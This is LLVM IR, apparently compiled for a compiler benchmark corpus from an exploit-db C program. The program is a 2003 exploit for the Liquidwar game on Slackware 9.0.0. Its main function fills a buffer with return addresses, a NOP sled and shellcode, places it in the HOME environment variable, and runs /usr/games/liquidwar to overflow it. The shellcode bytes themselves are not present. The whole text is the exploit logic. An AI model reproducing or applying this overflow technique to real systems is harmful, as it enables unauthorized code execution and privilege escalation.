; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23151.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23151.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@LEN = common dso_local global i32 0, align 4
@RET = common dso_local global i64 0, align 8
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [55 x i8] c"\0A(c) Rosiello Security 2003 - http://www.rosiello.org\0A\00", align 1
@.str.1 = private unnamed_addr constant [41 x i8] c"Liquidwar's exploit for Slackware 9.0.0\0A\00", align 1
@.str.2 = private unnamed_addr constant [43 x i8] c"by Angelo Rosiello - angelo@rosiello.org\0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [21 x i8] c"using address 0x%lx\0A\00", align 1
@shellcode = common dso_local global i32 0, align 4
@NOP = common dso_local global i8 0, align 1
@.str.4 = private unnamed_addr constant [5 x i8] c"HOME\00", align 1
@.str.5 = private unnamed_addr constant [21 x i8] c"/usr/games/liquidwar\00", align 1
@.str.6 = private unnamed_addr constant [10 x i8] c"liquidwar\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  %4 = alloca i64, align 8
  %5 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %6 = load i32, i32* @LEN, align 4
  %7 = zext i32 %6 to i64
  %8 = call i8* @llvm.stacksave()
  store i8* %8, i8** %2, align 8
  %9 = alloca i8, i64 %7, align 16
  store i64 %7, i64* %3, align 8
  %10 = load i64, i64* @RET, align 8
  store i64 %10, i64* %4, align 8
  %11 = load i32, i32* @stderr, align 4
  %12 = call i32 (i32, i8*, ...) @fprintf(i32 %11, i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str, i64 0, i64 0))
  %13 = load i32, i32* @stderr, align 4
  %14 = call i32 (i32, i8*, ...) @fprintf(i32 %13, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.1, i64 0, i64 0))
  %15 = load i32, i32* @stderr, align 4
  %16 = call i32 (i32, i8*, ...) @fprintf(i32 %15, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.2, i64 0, i64 0))
  %17 = load i32, i32* @stderr, align 4
  %18 = load i64, i64* %4, align 8
  %19 = call i32 (i32, i8*, ...) @fprintf(i32 %17, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.3, i64 0, i64 0), i64 %18)
  store i32 0, i32* %5, align 4
  br label %20

20:                                               ; preds = %30, %0
  %21 = load i32, i32* %5, align 4
  %22 = load i32, i32* @LEN, align 4
  %23 = icmp slt i32 %21, %22
  br i1 %23, label %24, label %33

24:                                               ; preds = %20
  %25 = load i64, i64* %4, align 8
  %26 = load i32, i32* %5, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds i8, i8* %9, i64 %27
  %29 = bitcast i8* %28 to i64*
  store i64 %25, i64* %29, align 1
  br label %30

30:                                               ; preds = %24
  %31 = load i32, i32* %5, align 4
  %32 = add nsw i32 %31, 4
  store i32 %32, i32* %5, align 4
  br label %20

33:                                               ; preds = %20
  store i32 0, i32* %5, align 4
  br label %34

34:                                               ; preds = %47, %33
  %35 = load i32, i32* %5, align 4
  %36 = load i32, i32* @LEN, align 4
  %37 = load i32, i32* @shellcode, align 4
  %38 = call i32 @strlen(i32 %37)
  %39 = sub nsw i32 %36, %38
  %40 = sub nsw i32 %39, 50
  %41 = icmp slt i32 %35, %40
  br i1 %41, label %42, label %50

42:                                               ; preds = %34
  %43 = load i8, i8* @NOP, align 1
  %44 = load i32, i32* %5, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds i8, i8* %9, i64 %45
  store i8 %43, i8* %46, align 1
  br label %47

47:                                               ; preds = %42
  %48 = load i32, i32* %5, align 4
  %49 = add nsw i32 %48, 1
  store i32 %49, i32* %5, align 4
  br label %34

50:                                               ; preds = %34
  %51 = load i32, i32* %5, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds i8, i8* %9, i64 %52
  %54 = load i32, i32* @shellcode, align 4
  %55 = load i32, i32* @shellcode, align 4
  %56 = call i32 @strlen(i32 %55)
  %57 = call i32 @memcpy(i8* %53, i32 %54, i32 %56)
  %58 = call i32 @setenv(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0), i8* %9, i32 1)
  %59 = call i32 @execl(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.5, i64 0, i64 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.6, i64 0, i64 0), i32* null)
  store i32 0, i32* %1, align 4
  %60 = load i8*, i8** %2, align 8
  call void @llvm.stackrestore(i8* %60)
  %61 = load i32, i32* %1, align 4
  ret i32 %61
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @fprintf(i32, i8*, ...) #2

declare dso_local i32 @strlen(i32) #2

declare dso_local i32 @memcpy(i8*, i32, i32) #2

declare dso_local i32 @setenv(i8*, i8*, i32) #2

declare dso_local i32 @execl(i8*, i8*, i32*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
